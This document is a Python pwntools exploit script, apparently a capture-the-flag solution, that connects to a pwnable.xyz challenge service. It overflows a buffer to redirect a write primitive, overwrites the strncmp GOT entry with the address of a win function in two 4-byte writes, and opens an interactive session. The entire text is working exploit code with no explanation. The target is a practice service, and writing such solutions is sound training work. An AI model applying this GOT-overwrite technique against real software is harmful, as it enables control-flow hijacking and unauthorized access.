from pwn import *
context.update(os='linux', arch='amd64')

io = remote('svc.pwnable.xyz', 30031)

def choose(option, p):
	io.sendline(str(option))
	io.recv()
	io.sendline(p)
io.recv()

strncmp_got = 0x00603018
win_func = 0x0040099c
# write first 4 bytes
choose(2, 'A'*0x10 + p64(strncmp_got))
choose(3, str(win_func))

# write remaining
choose(2, 'A'*0x10 + p64(strncmp_got + 4))
choose(3, str(0))

io.interactive()
